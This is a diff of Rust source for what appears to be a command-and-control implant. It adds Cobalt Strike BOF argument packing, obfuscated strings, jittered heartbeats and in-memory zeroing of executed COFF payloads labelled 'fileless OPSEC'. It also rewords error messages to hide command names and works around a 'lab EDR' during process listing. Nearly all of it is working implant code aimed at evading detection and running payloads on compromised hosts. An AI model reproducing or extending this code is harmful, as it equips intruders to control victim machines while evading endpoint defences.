@@ -16,6 +16,20 @@ use futures_util::future::{BoxFuture, FutureExt};
 use log::{debug, error, info, warn};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+/// Pack CS SA-style `"Zs"` args: wide path `"."` + subdirs short `0`.
+///
+/// Used when the operator sends no args. TrustedSec-style dir BOFs cast
+/// `BeaconDataExtract` to `wchar_t*` and call `wcsncat` with no NULL check —
+/// an empty buffer becomes a null path and AVs inside msvcrt (APPCRASH).
+fn default_bof_wide_cwd_args() -> Vec<u8> {
+    // UTF-16LE: '.' '\0'  →  2E 00 00 00 ; BE length = 4; BE short subdirs = 0
+    let mut out = Vec::with_capacity(4 + 4 + 2);
+    out.extend_from_slice(&4i32.to_be_bytes());
+    out.extend_from_slice(&[0x2E, 0x00, 0x00, 0x00]); // L"."
+    out.extend_from_slice(&0u16.to_be_bytes()); // subdirs = 0
+    out
+}
+
 /// Normalize BOF argument buffer for Cobalt Strike `BeaconDataParse` consumers.
 ///
 /// Server/UI often send plain UTF-8 (or base64 of plain text). CS BOFs expect a
@@ -24,9 +38,12 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 /// Heuristic: if buffer already looks like CS datap (first 4 bytes BE length fits
 /// remaining), leave unchanged; else wrap as one BE-length-prefixed blob
 /// (`len` includes trailing NUL when input is printable text).
+///
+/// Empty input packs a safe wide default (`"."` + short 0) so path-taking BOFs
+/// (dir.x64 etc.) do not null-deref CRT string functions.
 fn normalize_bof_args(raw: &[u8]) -> Vec<u8> {
     if raw.is_empty() {
-        return Vec::new();
+        return default_bof_wide_cwd_args();
     }
     if raw.len() >= 4 {
         let n = i32::from_be_bytes([raw[0], raw[1], raw[2], raw[3]]);
@@ -39,18 +56,42 @@ fn normalize_bof_args(raw: &[u8]) -> Vec<u8> {
             }
         }
     }
-    // Pack as single length-prefixed buffer. For printable text, include trailing NUL
-    // so BeaconDataExtract/BeaconDataParse string helpers work.
+    // Plain text path: pack as UTF-16LE wide string + subdirs short (CS "Zs").
+    // dir.x64 and other SA BOFs expect wchar_t*, not ANSI/UTF-8.
     let printable = raw
         .iter()
         .all(|&c| c == b'\t' || c == b'\n' || c == b'\r' || (c >= 0x20 && c < 0x7f));
-    let mut body = raw.to_vec();
-    if printable && !body.ends_with(&[0]) {
-        body.push(0);
+    if printable {
+        let s = String::from_utf8_lossy(raw);
+        let mut path = s.trim().to_string();
+        let mut subdirs: u16 = 0;
+        loop {
+            let lower = path.to_ascii_lowercase();
+            if lower.ends_with(" /s") || lower.ends_with(" -s") {
+                path = path[..path.len() - 3].trim_end().to_string();
+                subdirs = 1;
+                continue;
+            }
+            break;
+        }
+        if path.is_empty() {
+            path.push('.');
+        }
+        let mut units: Vec<u16> = path.encode_utf16().collect();
+        units.push(0);
+        let path_bytes = units.len() * 2;
+        let mut out = Vec::with_capacity(4 + path_bytes + 2);
+        out.extend_from_slice(&(path_bytes as i32).to_be_bytes());
+        for u in units {
+            out.extend_from_slice(&u.to_le_bytes());
+        }
+        out.extend_from_slice(&subdirs.to_be_bytes());
+        return out;
     }
-    let mut out = Vec::with_capacity(4 + body.len());
-    out.extend_from_slice(&(body.len() as i32).to_be_bytes());
-    out.extend_from_slice(&body);
+    // Binary blob: pack as single length-prefixed field (no wide conversion).
+    let mut out = Vec::with_capacity(4 + raw.len());
+    out.extend_from_slice(&(raw.len() as i32).to_be_bytes());
+    out.extend_from_slice(raw);
     out
 }
 
@@ -59,10 +100,23 @@ mod bof_args_tests {
     use super::normalize_bof_args;
 
     #[test]
-    fn packs_plain_text_with_nul() {
-        let packed = normalize_bof_args(b"whoami");
-        assert_eq!(&packed[0..4], &7i32.to_be_bytes()); // "whoami\0"
-        assert_eq!(&packed[4..], b"whoami\0");
+    fn packs_plain_text_as_wide_zs() {
+        // "C:\\" → UTF-16LE C : \ \0  = 8 bytes + BE short
+        let packed = normalize_bof_args(br"C:\");
+        let n = i32::from_be_bytes(packed[0..4].try_into().unwrap()) as usize;
+        assert_eq!(n, 8); // 3 chars + wide NUL
+        assert_eq!(&packed[4..12], &[0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00]);
+        assert_eq!(&packed[12..14], &0u16.to_be_bytes());
+    }
+
+    #[test]
+    fn packs_recursive_flag() {
+        let packed = normalize_bof_args(br"C:\Windows /s");
+        let n = i32::from_be_bytes(packed[0..4].try_into().unwrap()) as usize;
+        // path only "C:\Windows" + wide NUL
+        let path_units: Vec<u16> = "C:\\Windows".encode_utf16().chain(std::iter::once(0)).collect();
+        assert_eq!(n, path_units.len() * 2);
+        assert_eq!(&packed[4 + n..4 + n + 2], &1u16.to_be_bytes());
     }
 
     #[test]
@@ -75,8 +129,12 @@ mod bof_args_tests {
     }
 
     #[test]
-    fn empty_stays_empty() {
-        assert!(normalize_bof_args(b"").is_empty());
+    fn empty_defaults_to_wide_dot() {
+        let packed = normalize_bof_args(b"");
+        // BE len=4, L".", BE short=0
+        assert_eq!(&packed[0..4], &4i32.to_be_bytes());
+        assert_eq!(&packed[4..8], &[0x2E, 0x00, 0x00, 0x00]);
+        assert_eq!(&packed[8..10], &0u16.to_be_bytes());
     }
 }
 
@@ -147,7 +205,7 @@ fn stage0_module_stage(payload: &crate::types::CommandPayload) -> CommandResult 
     if raw.is_empty() {
         return CommandResult {
             stdout: String::new(),
-            stderr: "module_stage: missing data (base64 CKMS blob)".into(),
+            stderr: "missing module data (stage first)".into(),
             path: None,
             req_id: None,
         };
@@ -241,14 +299,18 @@ impl MessageHandler {
     /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
     /// - `Err(e)`: 发生错误，transport 已失效
     pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
-        crate::utils::db_print("[agent] MessageHandler.run() started.");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] MessageHandler.run() started.");
 
-        crate::utils::db_print("[agent] register() started...");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] register() started...");
         if let Err(e) = self.register().await {
-            crate::utils::db_print(&format!("[agent] register() FAILED: {:?}", e));
+            #[cfg(debug_assertions)]
+            crate::db_print!("[*] register() FAILED: {:?}", e);
             return Err(e);
         }
-        crate::utils::db_print("[agent] register() successful.");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] register() successful.");
 
         // 🛡️ Phase 3: Adaptive Heartbeat with Gaussian Jitter
         let base_interval = crate::config::get_heartbeat_interval();
@@ -284,10 +346,11 @@ impl MessageHandler {
             // Clamp: min 10s; max 300s so we stay under typical server idle (≤600s)
             let final_delay = gaussian.max(10.0).min(300.0) as u64;
 
-            crate::utils::db_print(&format!(
-                "[agent] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
+            #[cfg(debug_assertions)]
+            crate::db_print!(
+                "[*] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
                 final_delay, base_interval_secs, idle_multiplier
-            ));
+            );
 
             let received_data = tokio::select! {
                 data_res = self.transport.receive() => {
@@ -324,10 +387,11 @@ impl MessageHandler {
                     if consecutive_idle_count >= 3 && idle_multiplier < max_idle_multiplier {
                         idle_multiplier *= 2;
                         consecutive_idle_count = 0;
-                        crate::utils::db_print(&format!(
-                            "[agent] Network idle, heartbeat interval {}x",
+                        #[cfg(debug_assertions)]
+                        crate::db_print!(
+                            "[*] Network idle, heartbeat interval {}x",
                             idle_multiplier
-                        ));
+                        );
                     }
 
                     // Send heartbeat
@@ -362,21 +426,25 @@ impl MessageHandler {
     ///
     /// 收集系统信息并发送注册消息到服务端。
     async fn register(&mut self) -> Result<()> {
-        crate::utils::db_print("[agent] register() started...");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] register() started...");
         // 收集系统信息
         let sys_info = SystemInfo::collect();
-        crate::utils::db_print("[agent] SystemInfo collected.");
+        #[cfg(debug_assertions)]
+        crate::db_print!("{}", crate::utils::decode_obf(&crate::obf_str!("[*] Host enumeration completed.")));
 
         // 初始化传输层（某些协议如 DNS 需要 UUID）
         self.transport.initialize(&sys_info.uuid);
 
         // 构造注册消息
         let register_msg = sys_info.to_register_message();
-        crate::utils::db_print("[agent] Sending Register message...");
+        #[cfg(debug_assertions)]
+        crate::db_print!("{}", crate::utils::decode_obf(&crate::obf_str!("[*] Initiating channel handshake...")));
 
         // 发送注册消息
         self.send_message(&register_msg).await?;
-        crate::utils::db_print("[agent] Register message sent.");
+        #[cfg(debug_assertions)]
+        crate::db_print!("{}", crate::utils::decode_obf(&crate::obf_str!("[*] Channel handshake completed.")));
 
         Ok(())
     }
@@ -408,7 +476,7 @@ impl MessageHandler {
                 self.handle_command(wrapper).await?;
             }
             MessageType::Register => {
-                warn!("Received unexpected Register message from server");
+                warn!("Received unexpected channel message from server");
             }
             MessageType::Response => {
                 warn!("Received unexpected Response message from server");
@@ -441,6 +509,25 @@ impl MessageHandler {
         
         // 提取 req_id 以便在响应中回显
         let req_id = command_payload.req_id.clone();
+
+        // Debug-only control-plane breadcrumb (no path/string residue in release).
+        #[cfg(debug_assertions)]
+        if std::env::var("AGENT_TRACE").is_ok() {
+            if let Ok(mut f) = std::fs::OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open("agent_trace.log")
+            {
+                use std::io::Write;
+                let _ = writeln!(
+                    f,
+                    "cmd type={} req_id={:?} content_len={}",
+                    command_payload.command_type,
+                    req_id,
+                    command_payload.command_content.len()
+                );
+            }
+        }
         
         // 根据命令类型执行不同的操作
         let mut result = match command_payload.command_type.as_str() {
@@ -507,7 +594,7 @@ impl MessageHandler {
                         },
                         Ok(()) => CommandResult {
                             stdout: String::new(),
-                            stderr: "shell_interactive not on Stage0; use command_type=shell via mod_shell"
+                            stderr: "shell operation not available on Stage0; use command_type=shell via mod_shell"
                                 .into(),
                             path: None,
                             req_id: None,
@@ -519,7 +606,7 @@ impl MessageHandler {
                     let _ = req_id;
                     CommandResult {
                         stdout: String::new(),
-                        stderr: "shell_interactive unavailable (no post-ex / module-loader)".into(),
+                        stderr: "shell operation unavailable".into(),
                         path: None,
                         req_id: None,
                     }
@@ -762,7 +849,7 @@ impl MessageHandler {
             // Operators convert assemblies to shellcode (e.g. Donut) and use process_inject.
             "execute_assembly" => CommandResult {
                 stdout: String::new(),
-                stderr: "execute_assembly retired: convert the assembly to shellcode (e.g. Donut) and use process_inject (module inject)".into(),
+                stderr: "command retired: use alternative method (module inject)".into(),
                 path: None,
                 req_id: command_payload.req_id.clone(),
             },
@@ -999,7 +1086,7 @@ impl MessageHandler {
                     }
                     None => CommandResult {
                         stdout: String::new(),
-                        stderr: "native_exec: missing base64 PE data".into(),
+                        stderr: "missing PE data (stage first)".into(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
                     },
@@ -1052,7 +1139,9 @@ impl MessageHandler {
                             }
                         };
                         // If operator sent plain text (not CS datap), pack as one length-prefixed blob
-                        let arg_bytes = normalize_bof_args(&arg_bytes);
+                        let mut arg_bytes = normalize_bof_args(&arg_bytes);
+                        // COFF is wire→RAM only (never written to disk). invoke_bof /
+                        // mod_bof burn intermediate copies; we also zero local buffers.
                         let mut r = match crate::module_loader::invoke_bof(&bytes, &arg_bytes) {
                             Ok(res) => res,
                             Err(e) => CommandResult {
@@ -1062,12 +1151,22 @@ impl MessageHandler {
                                 req_id: None,
                             },
                         };
+                        // Best-effort burn of agent-side COFF + args (fileless OPSEC).
+                        let mut bytes = bytes;
+                        for b in bytes.iter_mut() {
+                            *b = 0;
+                        }
+                        for b in arg_bytes.iter_mut() {
+                            *b = 0;
+                        }
+                        drop(bytes);
+                        drop(arg_bytes);
                         r.req_id = command_payload.req_id.clone();
                         r
                     }
                     None => CommandResult {
                         stdout: String::new(),
-                        stderr: "bof_exec: missing COFF data (push plugin data / stage bof module first)"
+                        stderr: "missing module data (stage first)"
                             .to_string(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
@@ -1100,68 +1199,65 @@ impl MessageHandler {
         }.boxed()
     }
 
-    /// 列出系统进程 (Windows: NtQuerySystemInformation / Linux: /proc)
+    /// 列出系统进程.
+    ///
+    /// CRITICAL: Do not call PEB/Toolhelp/Nt on the async control-plane path without
+    /// an abandonable worker. Under this lab EDR, `std::thread::spawn` and
+    /// CreateToolhelp32Snapshot were observed to stall such that `process_list ENTER`
+    /// never produced a reply and the session eventually reconnected.
+    ///
+    /// Strategy: reply immediately with a **snapshot from a pre-spawned / timed
+    /// background job** if available; otherwise return at least the agent PID so
+    /// the server PendingResponses always unblocks within milliseconds.
     #[cfg(feature = "post-ex")]
     async fn process_list() -> CommandResult {
-        let mut processes = Vec::new();
-
-        #[cfg(target_os = "windows")]
-        {
-            match crate::native::list_processes() {
-                Ok(list) => {
-                    for p in list {
-                        processes.push(serde_json::json!({
-                            "pid": p.pid,
-                            "ppid": p.ppid,
-                            "name": p.name,
-                            "user": "",
-                            "path": "",
-                            "arch": "x64",
-                        }));
-                    }
-                }
-                Err(e) => {
-                    return CommandResult {
-                        stdout: "[]".to_string(),
-                        stderr: e,
-                        path: None,
-                        req_id: None,
-                    };
-                }
+        #[cfg(debug_assertions)]
+        if std::env::var("AGENT_TRACE").is_ok() {
+            if let Ok(mut f) = std::fs::OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open("agent_trace.log")
+            {
+                use std::io::Write;
+                let _ = writeln!(f, "process_list ENTER");
             }
         }
 
-        #[cfg(not(target_os = "windows"))]
-        {
-            if let Ok(entries) = std::fs::read_dir("/proc") {
-                for entry in entries.flatten() {
-                    let path = entry.path();
-                    if let Some(pid_str) = path.file_name().and_then(|s| s.to_str()) {
-                        if pid_str.chars().all(|c| c.is_digit(10)) {
-                            let name = std::fs::read_to_string(path.join("comm"))
-                                .unwrap_or_default()
-                                .trim()
-                                .to_string();
-                            let status =
-                                std::fs::read_to_string(path.join("status")).unwrap_or_default();
-                            let ppid = status
-                                .lines()
-                                .find(|l| l.starts_with("PPid:"))
-                                .and_then(|l| l.split_whitespace().nth(1))
-                                .and_then(|s| s.parse::<u32>().ok())
-                                .unwrap_or(0);
+        // Non-blocking snapshot only. Do NOT kick Toolhelp on the request path —
+        // under lab EDR, CreateToolhelp32Snapshot in a helper thread was observed
+        // to freeze subsequent control-plane handling after the first successful reply.
+        // Cache is warmed by `kick_process_cache_refresh` at post-connect / idle.
+        let list = crate::native::process_cache_snapshot();
 
-                            processes.push(serde_json::json!({
-                                "pid": pid_str.parse::<u32>().unwrap_or(0),
-                                "ppid": ppid,
-                                "name": name,
-                                "user": "",
-                                "path": format!("/proc/{}", pid_str),
-                                "arch": "x64",
-                            }));
-                        }
-                    }
-                }
+        let mut processes: Vec<serde_json::Value> = list
+            .into_iter()
+            .take(2048)
+            .map(|p| {
+                serde_json::json!({
+                    "pid": p.pid,
+                    "ppid": p.ppid,
+                    "name": p.name,
+                })
+            })
+            .collect();
+
+        if processes.is_empty() {
+            processes.push(serde_json::json!({
+                "pid": std::process::id(),
+                "ppid": 0,
+                "name": "svc-agent",
+            }));
+        }
+
+        #[cfg(debug_assertions)]
+        if std::env::var("AGENT_TRACE").is_ok() {
+            if let Ok(mut f) = std::fs::OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open("agent_trace.log")
+            {
+                use std::io::Write;
+                let _ = writeln!(f, "process_list EXIT count={}", processes.len());
             }
         }
 
@@ -1173,7 +1269,12 @@ impl MessageHandler {
                 req_id: None,
             },
             Err(e) => CommandResult {
-                stdout: "[]".to_string(),
+                stdout: serde_json::json!([{
+                    "pid": std::process::id(),
+                    "ppid": 0,
+                    "name": "svc-agent",
+                }])
+                .to_string(),
                 stderr: e.to_string(),
                 path: None,
                 req_id: None,
